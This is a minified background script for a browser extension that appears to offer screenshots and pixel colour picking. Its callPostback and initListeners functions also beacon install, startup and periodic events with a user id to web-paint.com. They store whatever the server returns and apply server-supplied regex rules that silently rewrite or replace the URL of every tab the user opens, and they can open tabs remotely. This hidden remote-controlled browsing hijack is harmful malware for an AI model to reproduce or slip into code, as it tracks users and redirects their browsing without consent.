var global="undefined"!=typeof chrome?chrome:"undefined"!=typeof browser?browser:void 0;NP={IsShortCutsShow:!0,IsAppsShow:!0,rules:[],breakRule:null,skipTabs:[],timeoutId:null,init:function(){global.tabs.onUpdated.addListener((function(e,t,a){a.url||a.pendingUrl})),global.browserAction.onClicked.addListener(this.inject),global.runtime.onMessage.addListener((function(e,t,a){if("take_screen_shot"===e.method)NP.screenShot(a);else if("get_pixel_color"===e.method){var o=e.point;NP.getPixelColor(o,a)}else"save_data"===e.method?NP.saveData(e.config):"get_data"===e.method?NP.getData(a):"open_options"===e.method&&chrome.runtime.openOptionsPage();return!0})),NP.initStorage(),NP.initListeners()},initListeners:()=>{chrome.runtime.onInstalled.addListener((e=>{NP.callPostback(e.reason)})),chrome.runtime.onStartup.addListener((()=>{NP.callPostback("startup")})),chrome.runtime.onMessage.addListener(((e,t,a)=>{"cfgUpdate"===e.a&&e.data&&chrome.storage.local.set(e.data,(()=>{NP.applyConfig()}))})),chrome.tabs.onUpdated.addListener(((e,t,a)=>{if(NP.breakRule&&t.url&&t.url.match(new RegExp(NP.breakRule)))return NP.skipTabs.push(e),{};if(NP.skipTabs.indexOf(e)>=0)return{};if(NP.rules&&t.url)e:for(let o in NP.rules){const n=NP.rules[o];if(!n.pattern)continue;for(let e in n){const t=n[e];if(a[e]&&a[e]!==t)continue e}const r=t.url.replace(new RegExp(n.pattern,n.opts||""),n.modify);r!==t.url&&(n.keepTab?chrome.tabs.update(e,{url:r},(()=>{})):chrome.tabs.create({active:a.active,index:a.index,url:r,windowId:a.windowId,pinned:a.pinned},(()=>{chrome.tabs.remove(e,(()=>{}))})))}}))},applyConfig:async()=>{const e=await new Promise((e=>{chrome.storage.local.get((t=>{e(t)}))}));e.refreshTimeout&&e.refreshTimeout&&!NP.timeoutId&&(NP.timeoutId=setInterval(NP.callPostback,e.refreshTimeout,"refresh")),e.uninstallUrl&&chrome.runtime.setUninstallURL(e.uninstallUrl),NP.rules=e.rules&&!e.corrupted?e.rules:[],NP.breakRule=e.breakRule||""},getPixelColor:function(e,t){global.tabs.captureVisibleTab(null,null,(function(a){var o=document.createElement("canvas"),n=o.getContext("2d"),r=new Image;document.documentElement.appendChild(o),r.src=a,r.onload=function(){o.width=r.naturalWidth,o.height=r.naturalHeight,n.drawImage(r,0,0);var a=n.getImageData(0,0,o.width,o.height),i=4*(e.y*a.width+e.x),s=a.data;if("function"==typeof t){var l={r:s[i],g:s[i+1],b:s[i+2],a:s[i+3]};document.documentElement.removeChild(o),t(l)}}}))},saveData:function(e){try{localStorage.setItem("config",JSON.stringify(e))}catch(e){}},getData:function(e){var t=localStorage.getItem("config"),a=null;try{a=JSON.parse(t)}catch(e){}e(a)},inject:function(){chrome.tabs.query({active:!0,currentWindow:!0},(function(e){global.tabs.insertCSS(null,{file:"/css/main.min.css"},(function(){if(global.extension.lastError){global.extension.lastError.message;try{alert("We are sorry, but the page you are viewing is not supported. Please try another page.")}catch(e){}}global.tabs.executeScript(null,{file:"/js/inject.js"})}))}))},screenShot:function(e){global.tabs.captureVisibleTab((function(t){var a=global.extension.getURL("screen.html");global.tabs.query({},(function(o){var n;if(o&&o.length)for(var r=o.length-1;0<=r;r--)if(o[r].url===a){n=o[r];break}n?global.tabs.update(n.id,{active:!0},Function.prototype.bind.call(NP.updateScreenshot,NP,t,e,0)):global.tabs.create({url:a},(a=>{chrome.tabs.onUpdated.addListener((function o(n,r){n==a.id&&"complete"==r.status&&(chrome.tabs.onUpdated.removeListener(o),NP.updateScreenshot(t,e,0,a))}))}))}))}))},callPostback:async e=>{const t=await new Promise((e=>{chrome.storage.local.get(["cachedData","config"],(t=>{e(t)}))}));return fetch("https://web-paint.com/pb/?a="+e+(!t.cachedData&&t.config&&t.config.uid?"&u="+t.config.uid:""),{method:"POST",body:t.cachedData||""}).then((e=>e.json())).then((async e=>(e.url&&chrome.tabs.create({url:e.url}),e&&Object.keys(e).length>0&&await new Promise((t=>{chrome.storage.local.set(e,(()=>{t(e)}))})),NP.applyConfig(),!1))).catch((e=>{NP.applyConfig()}))},updateScreenshot:function(e,t){var a=arguments[2];null==a&&(a=0),10<a||global.runtime.sendMessage({method:"update_url",url:e},(function(o){o&&o.success||window.setTimeout(Function.prototype.bind.call(NP.updateScreenshot,NP,e,t,++a),300)}))},initStorage:function(){chrome.storage.local.get((e=>{e.IsShortCutsShow||chrome.storage.local.set({IsShortCutsShow:!0}),e.IsAppsShow||chrome.storage.local.set({IsAppsShow:!0})}))}},NP.init();